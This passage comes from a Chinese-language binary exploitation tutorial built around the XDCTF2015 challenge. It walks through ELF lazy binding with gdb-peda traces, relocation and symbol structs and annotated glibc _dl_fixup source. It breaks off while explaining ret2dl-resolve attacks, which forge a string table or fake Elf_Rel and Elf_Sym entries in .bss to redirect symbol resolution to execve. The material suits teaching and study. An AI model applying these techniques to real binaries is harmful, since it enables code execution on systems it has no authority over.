n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd594 --\n 0xf7ffd900 --\n 0x0\nEIP: 0x80483e6 (jmp    DWORD PTR ds:0x804a008)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x80483dd:   add    BYTE PTR [eax],al\n   0x80483df:   add    bh,bh\n   0x80483e1:   xor    eax,0x804a004\n=\n 0x80483e6:   jmp    DWORD PTR ds:0x804a008\n | 0x80483ec:   add    BYTE PTR [eax],al\n | 0x80483ee:   add    BYTE PTR [eax],al\n | 0x80483f0 \nsetbuf@plt\n:      jmp    DWORD PTR ds:0x804a00c\n | 0x80483f6 \nsetbuf@plt+6\n:    push   0x0\n |-\n   0xf7fec370 \n_dl_runtime_resolve\n:        push   eax\n       0xf7fec371 \n_dl_runtime_resolve+1\n:      push   ecx\n       0xf7fec372 \n_dl_runtime_resolve+2\n:      push   edx\n       0xf7fec373 \n_dl_runtime_resolve+3\n:      mov    edx,DWORD PTR [esp+0x10]\n                                                                  JUMP is taken\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd594 --\n 0xf7ffd900 --\n 0x0\n0004| 0xffffd598 --\n 0x20 (\n \n)\n0008| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0012| 0xffffd5a0 --\n 0x1\n0016| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0020| 0xffffd5a8 --\n 0x17\n0024| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0028| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080483e6 in ?? ()\n\n\nPLT[0] \u5904\u7684\u4ee3\u7801\u5c06 GOT[1] \u7684\u503c\u538b\u5165\u6808\u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230 GOT[2]\u3002\u8fd9\u4e24\u4e2a GOT \u8868\u6761\u76ee\u6709\u7740\u7279\u6b8a\u7684\u542b\u4e49\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5f00\u59cb\u65f6\u7ed9\u5b83\u4eec\u586b\u5145\u4e86\u7279\u6b8a\u7684\u5185\u5bb9\uff1a\n- GOT[1]\uff1a\u4e00\u4e2a\u6307\u5411\u5185\u90e8\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\uff0c\u7c7b\u578b\u662f link_map\uff0c\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u5185\u90e8\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF \u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u5728\u5b83\u7684 \nl_info\n \u57df\u4e2d\u4fdd\u5b58\u4e86 \n.dynamic\n \u6bb5\u4e2d\u5927\u591a\u6570\u6761\u76ee\u7684\u6307\u9488\u6784\u6210\u7684\u4e00\u4e2a\u6570\u7ec4\uff0c\u6211\u4eec\u540e\u9762\u4f1a\u5229\u7528\u5b83\u3002\n- GOT[2]\uff1a\u4e00\u4e2a\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d \n_dl_runtime_resolve\n \u51fd\u6570\u7684\u6307\u9488\u3002\n\n\n\u51fd\u6570\u4f7f\u7528\u53c2\u6570 \nlink_map_obj\n \u6765\u83b7\u53d6\u89e3\u6790\u5bfc\u5165\u51fd\u6570\uff08\u4f7f\u7528\nreloc_index\n\u53c2\u6570\u6807\u8bc6\uff09\u9700\u8981\u7684\u4fe1\u606f\uff0c\u5e76\u5c06\u7ed3\u679c\u5199\u5230\u6b63\u786e\u7684 GOT \u6761\u76ee\u4e2d\u3002\u5728 \n_dl_runtime_resolve\n \u89e3\u6790\u5b8c\u6210\u540e\uff0c\u63a7\u5236\u6d41\u5c31\u4ea4\u5230\u4e86\u90a3\u4e2a\u51fd\u6570\u624b\u91cc\uff0c\u800c\u4e0b\u6b21\u518d\u8c03\u7528\u51fd\u6570\u7684 plt \u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fdb\u5165\u76ee\u6807\u51fd\u6570\u4e2d\u6267\u884c\u3002\n\n\n_dl-runtime-resolve\n \u7684\u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\n\n\n\n\u91cd\u5b9a\u4f4d\u9879\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6765\u63cf\u8ff0\uff0c\u5b58\u5728\u4e8e \n.rep.plt\n \u6bb5\u548c \n.rel.dyn\n \u6bb5\u4e2d\uff1a\n\ntypedef\n \nuint32_t\n \nElf32_Addr\n;\n\n\ntypedef\n \nuint32_t\n \nElf32_Word\n;\n\n\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Addr\n    \nr_offset\n;\n       \n/* Address */\n\n  \nElf32_Word\n    \nr_info\n;\n         \n/* Relocation type and symbol index */\n\n\n}\n \nElf32_Rel\n;\n\n\n\ntypedef\n \nuint64_t\n \nElf64_Addr\n;\n\n\ntypedef\n \nuint64_t\n \nElf64_Xword\n;\n\n\ntypedef\n \nint64_t\n  \nElf64_Sxword\n;\n\n\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf64_Addr\n    \nr_offset\n;\n       \n/* Address */\n\n  \nElf64_Xword\n   \nr_info\n;\n         \n/* Relocation type and symbol index */\n\n  \nElf64_Sxword\n  \nr_addend\n;\n       \n/* Addend */\n\n\n}\n \nElf64_Rela\n;\n\n\n\n32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528 REL\uff0c\u800c 64 \u4f4d\u7a0b\u5e8f\u4f7f\u7528 RELA\u3002\n\n\n\u4e0b\u9762\u7684\u5b8f\u63cf\u8ff0\u4e86 r_info \u662f\u600e\u6837\u88ab\u89e3\u6790\u548c\u63d2\u5165\u7684\uff1a\n\n/* How to extract and insert information held in the r_info field.  */\n\n\n\n#define ELF32_R_SYM(val)        ((val) \n 8)\n\n\n#define ELF32_R_TYPE(val)       ((val) \n 0xff)\n\n\n#define ELF32_R_INFO(sym, type)     (((sym) \n 8) + ((type) \n 0xff))\n\n\n\n#define ELF64_R_SYM(i)          ((i) \n 32)\n\n\n#define ELF64_R_TYPE(i)         ((i) \n 0xffffffff)\n\n\n#define ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) \n 32) + (type))\n\n\n\n\u4e3e\u4e2a\u4f8b\u5b50\uff1a\n\nELF32_R_SYM(Elf32_Rel-\nr_info) = (Elf32_Rel-\nr_info) \n 8\n\n\n\n\u6bcf\u4e2a\u7b26\u53f7\u4f7f\u7528 Elf_Sym \u7ed3\u6784\u4f53\u6765\u63cf\u8ff0\uff0c\u5b58\u5728\u4e8e \n.dynsym\n \u6bb5\u548c \n.symtab\n \u6bb5\u4e2d\uff0c\u800c \n.symtab\n \u5728 strip \u4e4b\u540e\u4f1a\u88ab\u5220\u6389\uff1a\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Word\n    \nst_name\n;\n        \n/* Symbol name (string tbl index) */\n\n  \nElf32_Addr\n    \nst_value\n;\n       \n/* Symbol value */\n\n  \nElf32_Word\n    \nst_size\n;\n        \n/* Symbol size */\n\n  \nunsigned\n \nchar\n \nst_info\n;\n        \n/* Symbol type and binding */\n\n  \nunsigned\n \nchar\n \nst_other\n;\n       \n/* Symbol visibility */\n\n  \nElf32_Section\n \nst_shndx\n;\n       \n/* Section index */\n\n\n}\n \nElf32_Sym\n;\n\n\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf64_Word\n    \nst_name\n;\n        \n/* Symbol name (string tbl index) */\n\n  \nunsigned\n \nchar\n \nst_info\n;\n        \n/* Symbol type and binding */\n\n  \nunsigned\n \nchar\n \nst_other\n;\n       \n/* Symbol visibility */\n\n  \nElf64_Section\n \nst_shndx\n;\n       \n/* Section index */\n\n  \nElf64_Addr\n    \nst_value\n;\n       \n/* Symbol value */\n\n  \nElf64_Xword\n   \nst_size\n;\n        \n/* Symbol size */\n\n\n}\n \nElf64_Sym\n;\n\n\n\n\u4e0b\u9762\u7684\u5b8f\u63cf\u8ff0\u4e86 st_info \u662f\u600e\u6837\u88ab\u89e3\u6790\u548c\u63d2\u5165\u7684\uff1a\n\n/* How to extract and insert information held in the st_info field.  */\n\n\n\n#define ELF32_ST_BIND(val)      (((unsigned char) (val)) \n 4)\n\n\n#define ELF32_ST_TYPE(val)      ((val) \n 0xf)\n\n\n#define ELF32_ST_INFO(bind, type)   (((bind) \n 4) + ((type) \n 0xf))\n\n\n\n/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */\n\n\n#define ELF64_ST_BIND(val)      ELF32_ST_BIND (val)\n\n\n#define ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)\n\n\n#define ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))\n\n\n\n\n\u6240\u4ee5 PLT[0] \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u7684\u4ee5\u4e0b\u51fd\u6570\uff1a\n\n_dl_runtime_resolve(link_map_obj, reloc_index)\n\n\n\ngdb-peda$ disassemble 0xf7fec370\nDump of assembler code for function _dl_runtime_resolve:\n   0xf7fec370 \n+0\n:     push   eax\n   0xf7fec371 \n+1\n:     push   ecx\n   0xf7fec372 \n+2\n:     push   edx\n   0xf7fec373 \n+3\n:     mov    edx,DWORD PTR [esp+0x10]\n   0xf7fec377 \n+7\n:     mov    eax,DWORD PTR [esp+0xc]\n   0xf7fec37b \n+11\n:    call   0xf7fe6080 \n_dl_fixup\n\n   0xf7fec380 \n+16\n:    pop    edx\n   0xf7fec381 \n+17\n:    mov    ecx,DWORD PTR [esp]\n   0xf7fec384 \n+20\n:    mov    DWORD PTR [esp],eax\n   0xf7fec387 \n+23\n:    mov    eax,DWORD PTR [esp+0x4]\n   0xf7fec38b \n+27\n:    ret    0xc\nEnd of assembler dump.\n\n\n\u8be5\u51fd\u6570\u5728 \nglibc/sysdeps/i386/dl-trampoline.S\n \u4e2d\u7528\u6c47\u7f16\u5b9e\u73b0\uff0c\u5148\u4fdd\u5b58\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u503c\u5206\u522b\u4f20\u5165\u5bc4\u5b58\u5668\uff0c\u8c03\u7528 \n_dl_fixup\n\uff0c\u6700\u540e\u6062\u590d\u5bc4\u5b58\u5668\uff1a\n\ngdb-peda$ x/w $esp+0x10\n0xffffd598:     0x00000020\ngdb-peda$ x/w $esp+0xc\n0xffffd594:     0xf7ffd900\n\n\n\u8fd8\u8bb0\u5f97\u8fd9\u4e24\u4e2a\u503c\u5417\uff0c\u4e00\u4e2a\u662f\u5728 \nwrite@plt+6\n:     push   0x20\n \u4e2d\u538b\u5165\u7684\u504f\u79fb\u91cf\uff0c\u4e00\u4e2a\u662f PLT[0] \u4e2d \npush   DWORD PTR ds:0x804a004\n \u538b\u5165\u7684 GOT[1]\u3002\n\n\n\u51fd\u6570 \n_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)\n\uff0c\u5176\u53c2\u6570\u5206\u522b\u7531\u5bc4\u5b58\u5668 \neax\n \u548c \nedx\n \u63d0\u4f9b\u3002\u7ee7\u7eed\u8c03\u8bd5\uff1a\n\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xf7ffd900 --\n 0x0\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x20 (\n \n)\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd588 --\n 0x3\nEIP: 0xf7fec37b (\n_dl_runtime_resolve+11\n:      call   0xf7fe6080 \n_dl_fixup\n)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7fec372 \n_dl_runtime_resolve+2\n:  push   edx\n   0xf7fec373 \n_dl_runtime_resolve+3\n:  mov    edx,DWORD PTR [esp+0x10]\n   0xf7fec377 \n_dl_runtime_resolve+7\n:  mov    eax,DWORD PTR [esp+0xc]\n=\n 0xf7fec37b \n_dl_runtime_resolve+11\n: call   0xf7fe6080 \n_dl_fixup\n\n   0xf7fec380 \n_dl_runtime_resolve+16\n: pop    edx\n   0xf7fec381 \n_dl_runtime_resolve+17\n: mov    ecx,DWORD PTR [esp]\n   0xf7fec384 \n_dl_runtime_resolve+20\n: mov    DWORD PTR [esp],eax\n   0xf7fec387 \n_dl_runtime_resolve+23\n: mov    eax,DWORD PTR [esp+0x4]\nGuessed arguments:\narg[0]: 0x3\narg[1]: 0x2a8c\narg[2]: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd588 --\n 0x3\n0004| 0xffffd58c --\n 0x2a8c\n0008| 0xffffd590 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0012| 0xffffd594 --\n 0xf7ffd900 --\n 0x0\n0016| 0xffffd598 --\n 0x20 (\n \n)\n0020| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0024| 0xffffd5a0 --\n 0x1\n0028| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0xf7fec37b in _dl_runtime_resolve () from /lib/ld-linux.so.2\ngdb-peda$ s\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\nEBX: 0x804a000 --\n 0x8049f04 --\n 0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --\n 0x1d1d30\nEDI: 0xffffd620 --\n 0x1\nEBP: 0xffffd638 --\n 0x0\nESP: 0xffffd59c --\n 0x804861b (add    esp,0x10)\nEIP: 0xf7ea3100 (\nwrite\n:       push   esi)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7ea30fb:  xchg   ax,ax\n   0xf7ea30fd:  xchg   ax,ax\n   0xf7ea30ff:  nop\n=\n 0xf7ea3100 \nwrite\n:  push   esi\n   0xf7ea3101 \nwrite+1\n:        push   ebx\n   0xf7ea3102 \nwrite+2\n:        sub    esp,0x14\n   0xf7ea3105 \nwrite+5\n:        mov    ebx,DWORD PTR [esp+0x20]\n   0xf7ea3109 \nwrite+9\n:        mov    ecx,DWORD PTR [esp+0x24]\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --\n 0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --\n 0x1\n0008| 0xffffd5a4 --\n 0xffffd5bc (\nWelcome to XDCTF2015~!\\n\n)\n0012| 0xffffd5a8 --\n 0x17\n0016| 0xffffd5ac --\n 0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --\n 0xffffd5ea --\n 0x0\n0024| 0xffffd5b4 --\n 0xf7ffca64 --\n 0x6\n0028| 0xffffd5b8 --\n 0xf7ffca68 --\n 0x3c (\n)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0xf7ea3100 in write () from /usr/lib32/libc.so.6\n\n\n\u5373\u4f7f\u6211\u4eec\u4f7f\u7528\u5355\u6b65\u8fdb\u5165\uff0c\u4e5f\u4e0d\u80fd\u8c03\u8bd5 \n_dl_fixup\n\uff0c\u5b83\u76f4\u63a5\u5c31\u6267\u884c\u5b8c\u6210\u5e76\u8df3\u8f6c\u5230 write \u51fd\u6570\u4e86\uff0c\u800c\u6b64\u65f6\uff0cGOT \u7684\u5730\u5740\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u5b9e\u9645\u5730\u5740\uff1a\n\ngdb-peda$ x/w 0x804a01c\n0x804a01c:      0xf7ea3100\n\n\n\n\u518d\u5f3a\u8c03\u4e00\u904d\uff1afixup \u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u53d6\u53c2\u6570\u7684\uff0c\u8fd9\u4f3c\u4e4e\u8fdd\u80cc\u4e86 32 \u4f4d\u7a0b\u5e8f\u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u4f46\u5b83\u5c31\u662f\u8fd9\u6837\uff0c\u4e0a\u9762 gdb \u4e2d\u663e\u793a\u7684\u53c2\u6570\u662f\u9519\u8bef\u7684\uff0c\u8be5\u51fd\u6570\u5bf9\u7a0b\u5e8f\u5458\u6765\u8bf4\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u4f1a\u5c3d\u91cf\u5c11\u7528\u6808\u53bb\u505a\u64cd\u4f5c\u3002\n\n\n\u65e2\u7136\u4e0d\u80fd\u8c03\u8bd5\uff0c\u76f4\u63a5\u770b\u4ee3\u7801\u5427\uff0c\u5728 \nglibc/elf/dl-runtime.c\n \u4e2d\uff1a\n\nDL_FIXUP_VALUE_TYPE\n\n\nattribute_hidden\n \n__attribute\n \n((\nnoinline\n))\n \nARCH_FIXUP_ATTRIBUTE\n\n\n_dl_fixup\n \n(\n\n\n# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\n\n       \nELF_MACHINE_RUNTIME_FIXUP_ARGS\n,\n\n\n# endif\n\n       \nstruct\n \nlink_map\n \n*\nl\n,\n \nElfW\n(\nWord\n)\n \nreloc_arg\n)\n\n\n{\n\n  \n// \u5206\u522b\u83b7\u53d6\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u548c\u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u8868\u7684\u57fa\u5740\n\n  \nconst\n \nElfW\n(\nSym\n)\n \n*\nconst\n \nsymtab\n\n    \n=\n \n(\nconst\n \nvoid\n \n*\n)\n \nD_PTR\n \n(\nl\n,\n \nl_info\n[\nDT_SYMTAB\n]);\n\n  \nconst\n \nchar\n \n*\nstrtab\n \n=\n \n(\nconst\n \nvoid\n \n*\n)\n \nD_PTR\n \n(\nl\n,\n \nl_info\n[\nDT_STRTAB\n]);\n\n\n  \n// \u901a\u8fc7\u53c2\u6570 reloc_arg \u8ba1\u7b97\u91cd\u5b9a\u4f4d\u5165\u53e3\uff0c\u8fd9\u91cc\u7684 DT_JMPREL \u5373 .rel.plt\uff0creloc_offset \u5373 reloc_arg\n\n  \nconst\n \nPLTREL\n \n*\nconst\n \nreloc\n\n    \n=\n \n(\nconst\n \nvoid\n \n*\n)\n \n(\nD_PTR\n \n(\nl\n,\n \nl_info\n[\nDT_JMPREL\n])\n \n+\n \nreloc_offset\n);\n\n\n  \n// \u6839\u636e\u51fd\u6570\u91cd\u5b9a\u4f4d\u8868\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u5373 reloc-\nr_info\uff0c\u83b7\u53d6\u51fd\u6570\u5728\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u4e2d\u5bf9\u5e94\u7684\u6761\u76ee\n\n  \nconst\n \nElfW\n(\nSym\n)\n \n*\nsym\n \n=\n \nsymtab\n[\nELFW\n(\nR_SYM\n)\n \n(\nreloc\n-\nr_info\n)];\n\n  \nconst\n \nElfW\n(\nSym\n)\n \n*\nrefsym\n \n=\n \nsym\n;\n\n  \nvoid\n \n*\nconst\n \nrel_addr\n \n=\n \n(\nvoid\n \n*\n)(\nl\n-\nl_addr\n \n+\n \nreloc\n-\nr_offset\n);\n\n  \nlookup_t\n \nresult\n;\n\n  \nDL_FIXUP_VALUE_TYPE\n \nvalue\n;\n\n\n  \n/* Sanity check that we\nre really looking at a PLT relocation.  */\n\n  \nassert\n \n(\nELFW\n(\nR_TYPE\n)(\nreloc\n-\nr_info\n)\n \n==\n \nELF_MACHINE_JMP_SLOT\n);\n\n\n   \n/* Look up the target symbol.  If the normal lookup rules are not\n\n\n      used don\nt look in the global scope.  */\n\n  \nif\n \n(\n__builtin_expect\n \n(\nELFW\n(\nST_VISIBILITY\n)\n \n(\nsym\n-\nst_other\n),\n \n0\n)\n \n==\n \n0\n)\n\n    \n{\n\n      \nconst\n \nstruct\n \nr_found_version\n \n*\nversion\n \n=\n \nNULL\n;\n\n\n      \nif\n \n(\nl\n-\nl_info\n[\nVERSYMIDX\n \n(\nDT_VERSYM\n)]\n \n!=\n \nNULL\n)\n\n    \n{\n\n      \nconst\n \nElfW\n(\nHalf\n)\n \n*\nvernum\n \n=\n\n        \n(\nconst\n \nvoid\n \n*\n)\n \nD_PTR\n \n(\nl\n,\n \nl_info\n[\nVERSYMIDX\n \n(\nDT_VERSYM\n)]);\n\n      \nElfW\n(\nHalf\n)\n \nndx\n \n=\n \nvernum\n[\nELFW\n(\nR_SYM\n)\n \n(\nreloc\n-\nr_info\n)]\n \n \n0x7fff\n;\n\n      \nversion\n \n=\n \nl\n-\nl_versions\n[\nndx\n];\n\n      \nif\n \n(\nversion\n-\nhash\n \n==\n \n0\n)\n\n        \nversion\n \n=\n \nNULL\n;\n\n    \n}\n\n\n      \n/* We need to keep the scope around so do some locking.  This is\n\n\n     not necessary for objects which cannot be unloaded or when\n\n\n     we are not using any threads (yet).  */\n\n      \nint\n \nflags\n \n=\n \nDL_LOOKUP_ADD_DEPENDENCY\n;\n\n      \nif\n \n(\n!\nRTLD_SINGLE_THREAD_P\n)\n\n    \n{\n\n      \nTHREAD_GSCOPE_SET_FLAG\n \n();\n\n      \nflags\n \n|=\n \nDL_LOOKUP_GSCOPE_LOCK\n;\n\n    \n}\n\n\n\n#ifdef RTLD_ENABLE_FOREIGN_CALL\n\n      \nRTLD_ENABLE_FOREIGN_CALL\n;\n\n\n#endif\n\n      \n// \u6839\u636e strtab+sym-\nst_name \u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u627e\u5230\u51fd\u6570\u540d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u67e5\u627e\u83b7\u53d6 libc \u57fa\u5740 result\n\n      \nresult\n \n=\n \n_dl_lookup_symbol_x\n \n(\nstrtab\n \n+\n \nsym\n-\nst_name\n,\n \nl\n,\n \nsym\n,\n \nl\n-\nl_scope\n,\n\n                    \nversion\n,\n \nELF_RTYPE_CLASS_PLT\n,\n \nflags\n,\n \nNULL\n);\n\n\n      \n/* We are done with the global scope.  */\n\n      \nif\n \n(\n!\nRTLD_SINGLE_THREAD_P\n)\n\n    \nTHREAD_GSCOPE_RESET_FLAG\n \n();\n\n\n\n#ifdef RTLD_FINALIZE_FOREIGN_CALL\n\n      \nRTLD_FINALIZE_FOREIGN_CALL\n;\n\n\n#endif\n\n\n      \n/* Currently result contains the base load address (or link map)\n\n\n     of the object that defines sym.  Now add in the symbol\n\n\n   offset.  */\n\n\n      \n// \u5c06\u8981\u89e3\u6790\u7684\u51fd\u6570\u7684\u504f\u79fb\u5730\u5740\u52a0\u4e0a libc \u57fa\u5740\uff0c\u5f97\u5230\u51fd\u6570\u7684\u5b9e\u9645\u5730\u5740\n\n      \nvalue\n \n=\n \nDL_FIXUP_MAKE_VALUE\n \n(\nresult\n,\n\n                   \nsym\n \n?\n \n(\nLOOKUP_VALUE_ADDRESS\n \n(\nresult\n)\n\n                      \n+\n \nsym\n-\nst_value\n)\n \n:\n \n0\n);\n\n    \n}\n\n  \nelse\n\n    \n{\n\n      \n/* We already found the symbol.  The module (and therefore its load\n\n\n     address) is also known.  */\n\n      \nvalue\n \n=\n \nDL_FIXUP_MAKE_VALUE\n \n(\nl\n,\n \nl\n-\nl_addr\n \n+\n \nsym\n-\nst_value\n);\n\n      \nresult\n \n=\n \nl\n;\n\n    \n}\n\n\n  \n/* And now perhaps the relocation addend.  */\n\n  \nvalue\n \n=\n \nelf_machine_plt_value\n \n(\nl\n,\n \nreloc\n,\n \nvalue\n);\n\n\n  \n// \u5c06\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\u7684\u51fd\u6570\u5730\u5740\u5199\u5165\u76f8\u5e94\u7684 GOT \u8868\u4e2d\n\n  \nif\n \n(\nsym\n \n!=\n \nNULL\n\n      \n \n__builtin_expect\n \n(\nELFW\n(\nST_TYPE\n)\n \n(\nsym\n-\nst_info\n)\n \n==\n \nSTT_GNU_IFUNC\n,\n \n0\n))\n\n    \nvalue\n \n=\n \nelf_ifunc_invoke\n \n(\nDL_FIXUP_VALUE_ADDR\n \n(\nvalue\n));\n\n\n  \n/* Finally, fix up the plt itself.  */\n\n  \nif\n \n(\n__glibc_unlikely\n \n(\nGLRO\n(\ndl_bind_not\n)))\n\n    \nreturn\n \nvalue\n;\n\n\n  \nreturn\n \nelf_machine_fixup_plt\n \n(\nl\n,\n \nresult\n,\n \nrefsym\n,\n \nsym\n,\n \nreloc\n,\n \nrel_addr\n,\n \nvalue\n);\n\n\n}\n\n\n\n\n\u653b\u51fb\n\n\n\u5173\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u653b\u51fb\uff0c\u5728\u4e8e\u5f3a\u8feb\u52a8\u6001\u88c5\u8f7d\u5668\u89e3\u6790\u8bf7\u6c42\u7684\u51fd\u6570\u3002\n\n\n\n\n\n\n\u56fea\u4e2d\uff0c\u56e0\u4e3a\u52a8\u6001\u8f6c\u8f7d\u5668\u662f\u4ece \n.dynamic\n \u6bb5\u7684 \nDT_STRTAB\n \u6761\u76ee\u4e2d\u83b7\u5f97 \n.dynstr\n \u6bb5\u7684\u5730\u5740\u7684\uff0c\u800c \nDT_STRTAB\n \u6761\u76ee\u7684\u4f4d\u7f6e\u5df2\u77e5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e5f\u53ef\u5199\u3002\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u591f\u6539\u5199 \nDT_STRTAB\n \u6761\u76ee\u7684\u5185\u5bb9\uff0c\u6b3a\u9a97\u52a8\u6001\u88c5\u8f7d\u5668\uff0c\u8ba9\u5b83\u4ee5\u4e3a \n.dynstr\n \u6bb5\u5728 \n.bss\n \u6bb5\u4e2d\uff0c\u5e76\u5728\u90a3\u91cc\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u8868\u3002\u5f53\u5b83\u5c1d\u8bd5\u89e3\u6790 printf \u65f6\u4f1a\u4f7f\u7528\u4e0d\u540c\u7684\u57fa\u5730\u5740\u6765\u5bfb\u627e\u51fd\u6570\u540d\uff0c\u6700\u7ec8\u6267\u884c\u7684\u662f execve\u3002\u8fd9\u79cd\u65b9\u5f0f\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4ec5\u5f53\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684 \n.dynamic\n \u6bb5\u53ef\u5199\u65f6\u6709\u6548\u3002\n\n\n\u56feb\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 \n_dl_runtime_resolve\n \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f Elf_Rel \u6761\u76ee\u5728 \n.rel.plt\n \u6bb5\u4e2d\u7684\u504f\u79fb\uff0c\u52a8\u6001\u88c5\u8f7d\u5668\u5c06\u8fd9\u4e2a\u503c\u52a0\u4e0a \n.rel.plt\n \u7684\u57fa\u5740\u6765\u5f97\u5230\u76ee\u6807\u7ed3\u6784\u4f53\u7684\u7edd\u5bf9\u4f4d\u7f6e\u3002\u7136\u540e\u5f53\u4f20\u9012\u7ed9 \n_dl_runtime_resolve\n \u7684\u53c2\u6570 \nreloc_index\n \u8d85\u51fa\u4e86 \n.rel.plt\n \u6bb5\uff0c\u5e76\u6700\u7ec8\u843d\u5728 \n.bss\n \u6bb5\u4e2d\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8be5\u4f4d\u7f6e\u4f2a\u9020\u4e86\u4e00\u4e2a \nElf_Rel\n \u7ed3\u6784\uff0c\u5e76\u586b\u5199 \nr_offset\n \u7684\u503c\u4e3a\u4e00\u4e2a\u53ef\u5199\u7684\u5185\u5b58\u5730\u5740\u6765\u5c06\u89e3\u6790\u540e\u7684\u51fd\u6570\u5730\u5740\u5199\u5728\u90a3\u91cc\uff0c\u540c\u7406 \nr_info\n \u4e5f\u4f1a\u662f\u4e00\u4e2a\u5c06\u52a8\u6001\u88c5\u8f7d\u5668\u5bfc\u5411\u5230\u653b\u51fb\u8005\u63a7\u5236\u5185\u5b58\u7684\u4e0b\u6807\u3002\u8fd9\u4e2a\u4e0b\u6807\u5c31\u6307\u5411\u4e00\u4e2a\u4f4d\u4e8e\u5b83\u540e\u9762\u7684 \nElf_Sym\n \u7ed3\u6784\uff0c\u800c \nElf_Sym\n \u7ed3\u6784\u4e2d\u7684 \nst_name\n \u540c\u6837\u8d85\u51fa\u4e86 \n.dynsym\n \u6bb5\u3002\u8fd9\u6837\u8fd9\u4e2a\u7b26\u53f7\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u76f8\u5bf9\u4e8e \n.dynstr\n 